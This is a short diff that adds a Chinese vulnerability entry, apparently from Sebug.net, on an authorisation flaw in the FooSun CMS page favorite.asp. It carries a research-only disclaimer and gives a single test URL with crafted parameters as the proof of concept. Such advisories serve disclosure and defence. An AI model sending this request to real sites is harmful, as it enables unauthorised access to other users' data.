@@ -1,0 +1,6 @@
+风讯(FooSun)favorite.asp页面存在越权漏洞(2)
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.http://ssvdb.com/User/favorite.asp?Action= sort&id=1&classID=1
